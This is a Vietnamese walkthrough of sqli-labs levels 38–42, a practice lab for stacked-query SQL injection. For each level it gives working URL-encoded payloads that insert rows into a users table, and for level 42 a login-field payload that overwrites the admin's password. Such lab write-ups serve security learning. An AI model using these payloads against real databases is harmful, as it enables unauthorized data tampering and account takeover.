# sql-labs (Stacked)

Link tải lab tại [đây](https://github.com/Audi-1/sqli-labs)

- [Less-38](#Less-38)
- [Less-39](#Less-39)
- [Less-40](#Less-40)
- [Less-41](#Less-41)
- [Less-42](#Less-42)

## Less-38

Ở câu này, chúng ta đã qua một khái niệm khác của SQLi gọi là `Stacked Queries SQL Injection (SQLi)`.

Như chúng ta đã biết, dấu `;` được sử dụng để kết thúc một câu lệnh trong SQL. Và trong dạng `Stacked` này, chúng ta có thể inject nhiều câu query vào database và với nhiều câu lệnh khác nhau như `CREATE`, `INSERT`... thậm chí là các câu lệnh nguy hiểm như `DELETE`,`DROP`.

Payload mình sử dụng câu lệnh `INSERT`.

Hình dưới là khi chưa inject vào.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-38_1.png?raw=true)

Payload: `?id=1%27;insert+into+users(id,username,password)+values(%271337%27,%27nguyendqn%27,%27Less-38%27)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-38_2.png?raw=true)

## Less-39

```mysql
SELECT * FROM users WHERE id=$id LIMIT 0,1
```

Tương tự câu 38.

Payload: `?id=1;insert%20into%20users(id,username,password)%20values(%2739%27,%27dqnn%27,%27Less-39%27)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-39.png?raw=true)

## Less-40

```mysql
SELECT * FROM users WHERE id=('$id') LIMIT 0,1
```

Tương tự 2 câu trước, chỉ là thay đổi câu query.

Payload: `?id=1%27);insert%20into%20users(id,username,password)%20values(%2740%27,%27user40%27,%27Less-40%27)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-40.png?raw=true)

## Less-41

```mysql
SELECT * FROM users WHERE id=$id LIMIT 0,1
```

Tương tự 3 câu trên. :joy:

Payload: `?id=1;insert%20into%20users(id,username,password)%20values(%2741%27,%27user41%27,%27Less-41%27)--+`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-41.png?raw=true)

## Less-42

Về cơ bản câu này tương tự câu 24, nhưng ở đây chúng ta vẫn sử dụng `Stacked` để bypass.

Cụ thể là mình sẽ sử dụng `UPDATE` để update password của admin.

Đây là pasword của admin khi mình chưa inject câu query.

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-41.png?raw=true)

Sau khi chèn câu query.

Payload: `login_user=admin&login_password=1';UPDATE+users+SET+password='i-hacked-u-again'+WHERE+username+='admin'--+&mysubmit=Login`

![Image](https://github.com/n9uyen/sqli-labs/blob/master/images/Less-41.png?raw=true)

